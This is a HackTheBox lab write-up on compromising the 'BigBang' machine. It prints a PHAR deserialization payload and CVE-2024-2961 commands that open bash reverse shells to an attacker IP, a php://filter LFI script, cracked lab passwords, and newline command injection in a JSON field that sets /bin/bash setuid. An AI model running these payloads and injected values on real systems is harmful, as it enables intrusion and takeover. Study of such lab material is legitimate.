---
title: Big Bang [Hard]
date: 2025-01-25
categories: [HackTheBox]
tags: AppSec Web Linux
img_path: /assets/Images/HTB_BigBang/logo.png
image:
  path: /assets/Images/HTB_BigBang/logo.png
---

# BigBang HTB [Hard]

## 🤨 Enumeration :-

Nmap Result !

```bash
# Nmap 7.94SVN scan initiated Sun Jan 26 06:02:35 2025 as: nmap -T4 -vv -sC -sV -oN nmap/intial 10.10.11.52
Increasing send delay for 10.10.11.52 from 0 to 5 due to 153 out of 381 dropped probes since last increase.
Increasing send delay for 10.10.11.52 from 5 to 10 due to 50 out of 124 dropped probes since last increase.
Nmap scan report for 10.10.11.52
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2025-01-26 06:02:35 IST for 47s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBET3VRLx4oR61tt3uTowkXZzNICnY44UpSL7zW4DLrn576oycUCy2Tvbu7bRvjjkUAjg4G080jxHLRJGI4NJoWQ=
|   256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbYOg6bg7lmU60H4seqYXpE3APnWEqfJwg1ojft/DPI
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 26 06:03:22 2025 -- 1 IP address (1 host up) scanned in 46.79 seconds

```

Website Nothing Interesting : )

![Screenshot 2025-01-27 at 10.53.19 PM.png](/assets/Images/HTB_BigBang/big01.png)

![Screenshot 2025-01-27 at 11.26.02 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_11.26.02_PM.png)

It is a Wordpress WebSite. So the Best Tools for this is wpscan

```bash
wpscan --url http://blog.bigbang.htb -v -e vp ap --random-user-agent dbe vt cb --api-token YOUR_TOKEN
```

We found multiply vulnerabilities [ buddy forms ]

![Screenshot 2025-01-27 at 11.05.31 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_11.05.31_PM.png)

Trying to get Username’s. If possible

```bash
wpscan --url http://blog.bigbang.htb -v -e u vp ap --random-user-agent dbe vt cb --api-token YOUR_TOKEN
```

So we got `shawking` `root` 

![Screenshot 2025-01-27 at 10.58.25 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_10.58.25_PM.png)

Notes ; )

```bash
Vulnerability [buddy forms]

Usernames: 
root
shawking
```

---

This part is where i just searching and reading the articles for the exploit !

This version of BuddyForms has an unauthenticated **PHAR deserialization vulnerability**. By searching for the related CVE, I found a helpful Medium blog.

[WordPress BuddyForms Plugin — Unauthenticated Insecure Deserialization (CVE-2023–26326)](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)

In short, the vulnerability allows us to upload a **PHAR file** disguised as a GIF by adding GIF-specific magic bytes to its `setStub` part. Once uploaded, we can use the `phar://` wrapper to query the file and trigger **Remote Code Execution (RCE)**.

However, as noted in the blog, we need a **gadget** to complete the deserialization chain. Unfortunately, newer versions of WordPress don't have the required gadget. Even so, this method is worth testing since it's our best lead at this point.

```php
<?php
class Evil {
    public function __wakeup() {
        // Reverse shell payload
        $ip = '10.10.14.xxx'; // Replace with your IP address
        $port = 2004;       // Replace with your listening port

        // Reverse shell command
        $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        system($cmd);
        die("Arbitrary Deserialization");
    }
}

// Check if phar.readonly is enabled
if (ini_get('phar.readonly')) {
    die("phar.readonly must be set to Off in your php.ini to create PHAR files.\n");
}

// Create a new PHAR archive
$phar = new Phar('evil.phar'); // Name of the PHAR file
$phar->startBuffering();
$phar->addFromString('test.txt', 'This is a test file.');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();

echo "[+] PHAR file created: evil.phar\n";
```

```php
php --define phar.readonly=0  pain.php
```

![Screenshot 2025-01-28 at 12.22.09 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.22.09_AM.png)

```bash
python3 -m http.server 8000
```

```jsx
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

action=upload_image_from_url&url=http://10.10.14.xxx:8000/evil.phar&id=pain05&accepted_files=image/gif
```

[ Alert! ] You can upload .gif .png .phar in this screenshot i used .gif but you have to use .phar as the above Burp Request ! this screenshot is just for prove that the file is uploading.

![Screenshot 2025-01-28 at 12.02.43 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.02.43_AM.png)

![Screenshot 2025-01-28 at 12.18.06 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.18.06_AM.png)

```bash
wget http://blog.bigbang.htb/wp-content/uploads/2025/01/pain05.png
```

![Screenshot 2025-01-28 at 12.19.09 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.19.09_AM.png)

Wait, it’s not just a PNG file. It seems like the data is being filtered through a PNG. We discovered snippets like `/etc/passwd` and some C code involving heap allocation, which suggests a possible **buffer overflow (BoF)** vulnerability.

After searching for “buffer overflow BuddyForms PHP,” we found this helpful [Medium blog](https://www.notion.so/jaytiwari/URL).

[Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)

The blog also includes a **Proof of Concept (PoC)** for the same BuddyForms PHP vulnerability we encountered earlier. The PoC code is available in their [GitHub repo](https://github.com/ambionics/cnext-exploits).

[https://github.com/ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits)

The exploit leverages an old vulnerability in the **iconv** function from the `libc` binary. When converting an encoding method (e.g., UTF-8 to ISO-2022-CN-EXT), it can overflow by up to **3 bytes**.

By combining this with specific PHP behaviors and BuddyForms bugs, the exploit can exfiltrate data through PNG files, ultimately leading to **Remote Code Execution (RCE)**.

The challenging part is understanding the workflow and modifying the script to align with the logic of this particular target.

![Screenshot 2025-01-28 at 12.27.51 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.27.51_AM.png)

Looking at the source code, we see a remote class responsible for downloading files. Running the script results in an error because, as we already observed, a specific request must be sent to upload the file.

As the first part of the exploit suggests, we can exfiltrate data by using **iconv** in combination with PHP wrapper methods, and injecting the payload into the URL part of the request.

```python
import requests
import sys
import time
import json

if len(sys.argv) != 2:
    print("Usage: python LFI.py <file_to_read>")
    sys.exit(1)

file_to_read = sys.argv[1]

url = "http://blog.bigbang.htb/wp-admin/admin-ajax.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

data = (
    "action=upload_image_from_url&id=1&accepted_files=image/gif&url="
    f"php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource={file_to_read}"
)

try:
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        result = response.json()
        if result.get("status") == "OK":
            file_url = result.get("response")
            if file_url.endswith(".png"):
                print(f"PNG URL: {file_url}")
                try:
                    file_response = requests.get(file_url)
                    if file_response.status_code == 200:
                        print("File Contents:")
                        print(file_response.text)
                    else:
                        print(f"Failed to retrieve file. Status code: {file_response.status_code}")
                except Exception as e:
                    print(f"An error occurred while fetching the file: {e}")

        else:
            print("Error: Status is not OK")
    else:
        print(f"Error: Received status code {response.status_code}")

except Exception as e:
    print(f"An error occurred: {e}")

```

### LFI

![Screenshot 2025-01-28 at 12.31.29 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.31.29_AM.png)

At this point, we need to modify the remote class in the script to help us extract the contents of `/proc/self/maps`. This file provides valuable information, such as the **`PHP heap** address` and the full path of the **libc** file.

Once we have this information, the next step is to remove the **GIF magic byte** from the file, as we no longer need it for the exploit. Afterward, we can extract the memory address of the **system()** function, which is critical for gaining control of the system.

To help with this, we use the **LFI.py** script again, which allows us to determine that we specifically need the **/usr/lib/x86_64-linux-gnu/libc.so.6** file. Once identified, we install this **libc** file on our local machine, and we’ll then update the **ELF path** to point to where we’ve installed it. This step is necessary for the exploit to work properly, as it ensures we're referencing the correct version of the **libc** file during the attack.

Must Read this 🔥 :

[文章 - 【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一）  - 先知社区](https://xz.aliyun.com/news/14127)

[Full Explanation ](https://www.notion.so/Full-Explanation-18a73e8e218180399400c32242d15b0f?pvs=21)

The Code and the libc.so.6 which you need to run this exploit 

```bash
python3 initial_exploit.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c"bash -i >& /dev/tcp/10.10.14.xxx/2004 0>&1"'
```

![Screenshot 2025-01-28 at 12.35.29 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.35.29_AM.png)

### Full Explanation of the exploit :

This Python script is an exploit for a vulnerability in PHP, identified as **CVE-2024-2961**. The vulnerability allows an attacker to escalate a file-read primitive into **Remote Code Execution (RCE)** on a target server. The exploit leverages a combination of PHP's file handling mechanisms, heap manipulation, and memory corruption techniques to achieve RCE.

Here’s a breakdown of the code and its functionality:

---

### **1. Overview**

The exploit targets a PHP application that allows file reading via a vulnerable function like `file_get_contents()`. By carefully crafting a payload, the attacker can manipulate the PHP heap and overwrite critical memory structures to execute arbitrary commands on the server.

---

### **2. Key Components**

### **2.1. Remote Class**

The `Remote` class is responsible for interacting with the target server. It provides methods to:

- **Send payloads**: Sends crafted payloads to the server using HTTP POST requests.
- **Download files**: Retrieves files from the server, such as `/proc/self/maps` (to analyze memory layout) and `libc.so` (to resolve library symbols).
- **Decode data**: Handles base64 decoding of responses.

This class is customizable to fit the target application's behavior.

---

### **2.2. Exploit Class**

The `Exploit` class orchestrates the attack. It performs the following steps:

1. **Check Vulnerability**:
    - Verifies if the target is reachable and supports the required PHP wrappers and filters (e.g., `data://`, `php://filter`, `zlib`).
    - Ensures the target is vulnerable to the exploit.
2. **Memory Analysis**:
    - Downloads `/proc/self/maps` to analyze the memory layout of the PHP process.
    - Identifies the heap and `libc` addresses, which are crucial for the exploit.
3. **Heap Manipulation**:
    - Uses a combination of PHP filters and heap manipulation techniques to corrupt the PHP heap.
    - Overwrites the `zend_mm_heap` structure, which controls memory allocation in PHP.
4. **Payload Construction**:
    - Constructs a payload that triggers the vulnerability and overwrites critical memory structures.
    - Uses a series of steps (Step 1 to Step 4) to manipulate the heap and achieve RCE.
5. **Command Execution**:
    - Overwrites the `custom_heap` field in the `zend_mm_heap` structure to point to a fake heap with custom `emalloc`, `efree`, and `erealloc` functions.
    - Replaces these functions with `system()` to execute arbitrary commands.

---

### **3. Exploit Steps**

### **Step 1: Reverse Free List Order**

- Allocates chunks to reverse the order of the free list, ensuring proper heap manipulation in subsequent steps.

### **Step 2: Insert Fake Pointer**

- Places a fake pointer in the heap to control the free list and redirect allocations to a desired location.

### **Step 3: Trigger Overflow**

- Uses a UTF-8 to ISO-2022-CN-EXT conversion to trigger a heap overflow, corrupting the free list.

### **Step 4: Overwrite Heap Structures**

- Overwrites the `zend_mm_heap` structure to hijack PHP's memory allocation functions.
- Replaces `emalloc`, `efree`, and `erealloc` with `system()` to execute commands.

---

### **4. Payload Construction**

The payload is constructed using a combination of:

- **Chunked encoding**: Breaks data into chunks for precise heap manipulation.
- **Compression**: Uses `zlib` compression to fit the payload into the desired format.
- **Base64 encoding**: Encodes the payload for transmission via HTTP.

The payload is sent to the server using the `php://filter` wrapper, which processes the payload through a series of filters to trigger the vulnerability.

---

### **5. Command Execution**

The exploit executes a command on the target server by:

1. Overwriting the `custom_heap` field in the `zend_mm_heap` structure.
2. Replacing memory allocation functions with `system()`.
3. Executing the command, which is passed as part of the payload.

The command is prefixed with `kill -9 $PPID` to terminate the PHP process after execution, preventing further unintended behavior.

---

### **6. Helper Functions**

The script includes several helper functions to:

- **Compress data**: Prepares data for `zlib.inflate`.
- **Base64 encode/decode**: Handles encoding and decoding of payloads.
- **Chunk data**: Breaks data into chunks for precise heap manipulation.
- **Pointer manipulation**: Constructs chunks containing pointers for heap corruption.

---

### **7. Exploit Execution**

The exploit is executed by:

1. Initializing the `Exploit` class with the target URL, command, and other parameters.
2. Running the exploit, which sends the payload to the server and triggers the vulnerability.
3. Checking if the exploit was successful based on the server's response.

---

### **8. Key Vulnerabilities Exploited**

- **File Read Primitive**: The ability to read files on the server (e.g., `/proc/self/maps`, `libc.so`).
- **Heap Corruption**: A bug in PHP's handling of certain character encodings allows heap corruption.
- **Memory Overwrite**: Overwriting critical memory structures (`zend_mm_heap`) to hijack PHP's memory allocation functions.

---

### **9. Example Usage**

To use the exploit:

1. Implement the `Remote` class to match the target application's behavior.
2. Provide the target URL and command to execute.
3. Run the exploit.

---

### **10. Mitigation**

To protect against this vulnerability:

- **Update PHP**: Ensure the PHP version is patched against CVE-2024-2961.
- **Disable Dangerous Wrappers**: Restrict the use of `php://filter` and other dangerous wrappers.
- **Input Validation**: Validate and sanitize user input to prevent file read primitives.
- **Memory Protections**: Use memory-safe languages or enable heap protections (e.g., ASLR, stack canaries).

---

### **Conclusion**

This exploit demonstrates a sophisticated attack that combines file read primitives, heap manipulation, and memory corruption to achieve RCE. It highlights the importance of secure coding practices and timely patching to prevent such vulnerabilities.

Summary : 

This Python script is an exploit for CVE-2024-2961, which is a PHP file-read to Remote Code Execution (RCE) vulnerability in CNEXT.

How it works:
1.	File Read Primitive:
•	It abuses PHP wrappers (php://filter, data://, etc.) to read files from the server, like /proc/self/maps and libc.so.6.
2.	Heap Manipulation:
•	It finds and corrupts PHP’s memory allocator (Zend Memory Manager) by overflowing a heap chunk using an encoding bug.
•	It tricks PHP into allocating memory at arbitrary locations.
3.	Gaining Code Execution:
•	It overwrites PHP’s memory structures to hijack execution flow.
•	It forces PHP to execute arbitrary commands using system(), leading to remote code execution.

In simple terms:
•	The exploit reads sensitive files from the server.
•	It manipulates memory to gain control.
•	It then executes commands on the target server remotely.

This is a highly advanced heap exploitation technique for hacking vulnerable PHP applications.

---

## 🔱 Initial Access :-

```bash
python3 initial_exploit.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c "bash -i >& /dev/tcp/10.10.14.xxx/2004 0>&1"'
```

![Screenshot 2025-01-28 at 12.35.29 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.35.29_AM.png)

First thing to check `wp-config.php` file. We got  cred of DB and the host ip is 172.17.0.1
So we will use chisel tool to do a reverse proxy on this machine including proxychains

![Screenshot 2025-01-27 at 7.53.17 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_7.53.17_PM.png)

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

```bash
./chisel server -p 8000 -reverse
```

```bash
./chisel client 10.10.15.xxx:8000 R:socks
```

```bash
proxychains mysql -u wp_user
```

![Screenshot 2025-01-27 at 8.09.30 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.09.30_PM.png)

after that enumerate the Database 

```sql
show tables;
```

```sql
select * from wp_users;
```

```sql
	shawking      $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
```

![Screenshot 2025-01-27 at 8.16.27 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.16.27_PM.png)

save it to a file `shawking_hash`

```bash
shawking:$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
```

```bash
john --wordlist=rockyou.txt shawking_hash
```

![Screenshot 2025-01-27 at 11.36.11 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_11.36.11_PM.png)

it will take a while to crack !

```bash
quantumphysics
```

```bash
ssh shawking@10.10.11.52
```

![Screenshot 2025-01-27 at 10.59.50 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_10.59.50_PM.png)

---

## 🗝️ Lateral Moment :-

i ran LinPeas on this and from the Output i got that in this machine there is a `grafana.db` file 

![Screenshot 2025-01-27 at 8.25.11 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.25.11_PM.png)

Download this file 

```bash
scp shawking@10.10.11.52:/opt/data/grafana.db grafana.db
```

![Screenshot 2025-01-27 at 8.33.19 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.33.19_PM.png)

Here if you can see we got 2 things one is that Hash & another is Salt for that Hash

so when i was searching i got this : 

[https://github.com/iamaldi/grafana2hashcat.git](https://github.com/iamaldi/grafana2hashcat.git)

save it to a file to convert it into hashcat formate 

```bash
echo "7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960,4umebBJucv" > ghashes.txt
```

```bash
python3 grafana2hashcat.py ghashes.txt
```

![Screenshot 2025-01-27 at 8.47.32 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.47.32_PM.png)

```bash
hashcat -m 10900 hashcat_dev.txt /usr/share/wordlists/rockyou.txt
```

![Screenshot 2025-01-27 at 9.19.12 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_9.19.12_PM.png)

```bash
Cracked!:bigbang
```

`satellite-app.apk` file 👀

![Screenshot 2025-01-27 at 8.48.52 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.48.52_PM.png)

---

## 💀 Privilege Escalation :-

```bash
ssh developer@10.10.11.52
```

→ `bigbang`

so i used apktool first to decompile  but there are too many file so i switched to jdx-gui

![Screenshot 2025-01-27 at 8.48.52 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.48.52_PM%201.png)

```bash
scp developer@$10.10.11.52:/home/developer/android/satellite-app.apk satellite-app.apk
```

![Screenshot 2025-01-27 at 8.55.46 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_8.55.46_PM.png)

![Screenshot 2025-01-28 at 1.02.25 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.02.25_AM.png)

Open that `satellite-app.apk`  in this and check so there is a interesting part !

We see the application is on the port 9090

Tracing back the **MainActivity** function, we discovered a **Login** method that uses a custom listener. Upon examining the listener, we found methods that interact with an endpoint by sending some credentials. The endpoint responds with a **JSON Web Token (JWT)**, which is likely used for authentication.

![Screenshot 2025-01-28 at 1.07.34 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.07.34_AM.png)

![Screenshot 2025-01-28 at 1.07.49 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.07.49_AM.png)

we can confirm that it is there on locahost port 9090 for that application

![Screenshot 2025-01-28 at 12.59.54 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_12.59.54_AM.png)

We found an endpoint that provides a **JWT** and another that accepts commands. Our goal is to figure out how to send a command to this second endpoint. From the login functionality, we already understand how to interact with the login endpoint.

As we explored the source code further, we came across the **function `b` under `q0`**, which seems relevant to our next steps.

![Screenshot 2025-01-28 at 1.09.08 AM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-28_at_1.09.08_AM.png)

We observed that the function requires an input file and an output file, but we have control over the **output file**. The function creates a file based on the output file name we provide. This gives us an opportunity to attempt **command injection** by manipulating the output file name.

First thing was to get auth TOKEN 

```bash
curl -X POST http://127.0.0.1:9090/login -H "Content-Type: application/json" -d '{"username":"developer","password":"bigbang"}'
```

![Screenshot 2025-01-27 at 10.33.04 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_10.33.04_PM.png)

Trying for just executing file after many fail attempts 

before that make a file 

```bash
touch /tmp/foo
```

```bash
chmod +x /tmp/foo
```

Because the first argument which we will give is this foo then we will inject our second command with that and just to test we’ll make a pain file on /tmp

```bash
curl -X POST http://127.0.0.1:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzk5NzQ1MCwianRpIjoiN2NmOTYzM2YtMGQzZS00NWMzLWJmM2UtNmM1NTY3MjA1ZDczIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzk5NzQ1MCwiY3NyZiI6IjZiMDIyN2FlLTk5YWEtNDkzMS04YjQ3LWQxMDE5OWIxZGZiMiIsImV4cCI6MTczODAwMTA1MH0.XEjpZ7dcUlUVZnKqPDjzZ3oGrLQbAorF31idJLF8TfE" -d '{"command":"send_image","output_file":"foo \ntouch /tmp/pain"}'
```

![Screenshot 2025-01-27 at 10.40.46 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_10.40.46_PM.png)

Finally the Commands are executing and the file owner is root 

Changing the permission on /bin/bash to gain root privilege : )

```bash
curl -X POST http://127.0.0.1:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzk5NzQ1MCwianRpIjoiN2NmOTYzM2YtMGQzZS00NWMzLWJmM2UtNmM1NTY3MjA1ZDczIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzk5NzQ1MCwiY3NyZiI6IjZiMDIyN2FlLTk5YWEtNDkzMS04YjQ3LWQxMDE5OWIxZGZiMiIsImV4cCI6MTczODAwMTA1MH0.XEjpZ7dcUlUVZnKqPDjzZ3oGrLQbAorF31idJLF8TfE" -d '{"command":"send_image","output_file":"foo \nchmod 4777 /bin/bash"}'
```

```bash
/bin/bash -p
```

![Screenshot 2025-01-27 at 10.45.10 PM.png](/assets/Images/HTB_BigBang/Screenshot_2025-01-27_at_10.45.10_PM.png)

### Thanks For reading this whole Writeup ! i Hope you Like it
